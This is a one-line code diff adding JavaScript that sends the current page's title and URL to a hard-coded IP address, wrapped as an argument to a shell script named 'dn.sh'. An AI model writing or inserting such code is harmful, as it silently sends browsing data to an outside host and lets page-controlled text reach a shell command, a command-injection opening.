@@ -1,0 +1,1 @@
+var aaa="dn.sh "  + "'" + encodeURI(document.title) + "##############"+document.URL+"'"; window.open('http://45.32.200.249:8060/ddd?url=ddd&ddd=%27+aaa
